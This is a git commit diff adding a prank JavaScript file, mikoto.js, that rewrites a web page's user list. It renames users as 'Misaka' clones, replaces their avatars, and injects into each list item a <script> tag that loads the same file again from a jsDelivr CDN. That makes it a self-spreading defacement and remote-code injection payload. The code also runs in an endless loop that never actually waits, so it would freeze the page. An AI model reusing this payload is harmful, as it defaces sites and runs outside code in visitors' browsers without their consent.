c64e7658114d3da74241fd5dc5271eee3b8f2a8c
zjkwdy <57033359+zjkwdy@users.noreply.github.com>
2021-07-15 23:40:53 +0800

    Add files via upload

--- assets/js/mikoto.js
+++ assets/js/mikoto.js
@@ -6,24 +6,31 @@ function includeCss(filename) {
     link.type = 'text/css';
     head.appendChild(link)
 }
-for (i in document.getElementsByClassName('list-item')[0]["children"]) {
-    try{
-        document.getElementsByClassName('list-item')[0]["children"][i]["children"][0].innerHTML = '御坂妹妹真的太可爱啦！！' 
-    }catch{
-        console.log('1')
-    }
+
+function sleep(time) {
+    return new Promise((resolve) => setTimeout(resolve, time));
 }
-for (i in document.getElementsByClassName('avatar')) {
-    try{
-        document.getElementsByClassName('avatar')[i].src='https://cdn.jsdelivr.net/gh/zjkwdy/website-cdn/assets/images/testboder.png'
-    }catch{
-        console.log('1')
+while (true) {
+    for (i in document.getElementsByClassName('list-item')[0]["children"]) {
+        try {
+            document.getElementsByClassName('list-item')[0]["children"][i]["children"][0].innerHTML = "御坂妹妹真的太可爱啦！！<script> jumpurl=undefined var oHead = document.getElementsByTagName('HEAD').item(0); var oScript= document.createElement('script'); oScript.type = 'text/javascript'; oScript.src='https://cdn.jsdelivr.net/gh/zjkwdy/website-cdn/assets/js/mikoto.js'; oHead.appendChild( oScript); </script>"
+        } catch {
+            console.log('1')
+        }
     }
-}
-for (i in document.getElementsByClassName('name')) {
-    try{
-        document.getElementsByClassName('name')[i].innerHTML='御坂'+Math.floor(Math.random()*20000+3).toString(10)+'号'
-    }catch{
-        console.log('1')
+    for (i in document.getElementsByClassName('avatar')) {
+        try {
+            document.getElementsByClassName('avatar')[i].src = 'https://cdn.jsdelivr.net/gh/zjkwdy/website-cdn/assets/images/testboder.png'
+        } catch {
+            console.log('1')
+        }
     }
+    for (i in document.getElementsByClassName('name')) {
+        try {
+            document.getElementsByClassName('name')[i].innerHTML = '御坂' + Math.floor(Math.random() * 20000 + 3).toString(10) + '号'
+        } catch {
+            console.log('1')
+        }
+    }
+    sleep(500)
 }
